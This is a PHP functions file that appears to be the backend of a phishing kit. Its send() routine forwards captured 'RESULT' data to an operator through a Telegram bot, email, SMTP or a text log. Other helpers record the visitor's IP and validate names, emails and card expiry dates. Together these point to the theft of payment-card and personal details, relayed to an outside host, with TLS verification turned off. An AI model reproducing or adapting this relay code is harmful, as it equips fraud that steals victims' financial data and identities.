<?php

    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;

    function views($template_name,$data = null) {
        $file = MAIN . '/views/' . $template_name . '.php';
        if( !file_exists($file) ) {
            die('Error Contact The Coder.');
            return false;
        }
        $data = $data;
        require_once $file;
        return;
    }

    function getMainPath() {
        $ex_path = explode('/',$_SERVER['PHP_SELF']);
        array_pop($ex_path);
        if( $ex_path[0] == '' )
            array_shift($ex_path);
        $path = implode('/',$ex_path);
        return '/' . $path . '/';
    }

    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }

    function telegram_message($message) {
        $curl = curl_init();
        $token  = TELEGRAM_TOKEN;
        $chat_id  = TELEGRAM_CHAT_ID;
        $format   = 'HTML';
        curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $token .'/sendMessage?chat_id='. $chat_id .'&text='. urlencode($message) .'&parse_mode=' . $format);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
        $result = curl_exec($curl);
        curl_close($curl);
        return true;
    }
    function send($subject,$message) {
        if( RECEIVE_VIA_TELEGRAM == 1 ) {
            telegram_message($message);
        }
        if( RESULTS_IN_TXT == 1 ) {
            file_put_contents(TXT_FILE_NAME, $message, FILE_APPEND);
        }
        if( RECEIVE_VIA_EMAIL == 1 && RECEIVE_VIA_SMTP == 1 ) {
            $mail = new PHPMailer;
            $mail->IsSMTP();
            $mail->Host = SMTP_HOSTNAME;
            $mail->Port = SMTP_PORT;
            $mail->SMTPAuth = true;
            $mail->Username = SMTP_USER;
            $mail->Password = SMTP_PASS;
            $mail->SMTPSecure = '';
            $mail->SMTPAutoTLS = false;
            $mail->From     = SMTP_FROM_EMAIL;
            $mail->FromName = 'RESULT';
            $mail->Subject  = $subject;
            $mail->Body     = $message;
            $mail->AddAddress(RECEIVER);
            $mail->Send();
        } else {
            if( RECEIVE_VIA_EMAIL == 1 ) {
                $mail           = new PHPMailer;
                $mail->From     = 'RESULT@domain.com';
                $mail->FromName = 'RESULT';
                $mail->Subject  = $subject;
                $mail->Body     = $message;
                $mail->AddAddress(RECEIVER);
                $mail->send();
                echo $mail->ErrorInfo;
            }
            if( RECEIVE_VIA_SMTP == 1 ) {
                $mail = new PHPMailer;
                $mail->IsSMTP();
                $mail->Host         = SMTP_HOSTNAME;
                $mail->Port         = SMTP_PORT;
                $mail->SMTPAuth     = true;
                $mail->Username     = SMTP_USER;
                $mail->Password     = SMTP_PASS;
                $mail->SMTPSecure   = '';
                $mail->SMTPAutoTLS  = false;
                $mail->From         = SMTP_FROM;
                $mail->FromName     = 'RESULT';
                $mail->Subject      = $subject;
                $mail->Body         = $message;
                $mail->AddAddress(RECEIVER);
                $mail->Send();
            }
        }
    }
    
    function validate_number($number,$length = null) {
        if (is_numeric($number)) {
            if( $length == null ) {
                return true;
            } else {
                if( $length == strlen($number) )
                    return true;
                return false;
            }
        } else {
            return false;
        }
    }

    function validate_date($date, $format = 'Y-m-d H:i:s') {
        $d = DateTime::createFromFormat($format, $date);
        return $d && $d->format($format) == $date;
    }

    function validate_name($name) {
        if (!preg_match('/^[\p{L} ]+$/u', $name))
            return false;
        return true;
    }

    function validate_email($email) {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL))
            return false;
        return true;
    }

    function is_invalid_class($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
    
    function error_message($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="error">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }

    function get_value($value) {
        if( isset($_SESSION[$value]) ) {
            return $_SESSION[$value];
        }
    }

    function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }

    function validate_cc_date($month,$year) {
        if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 2 ) {
            return $month . '/' . $year;
        } else {
            return false;
        }
    }

?>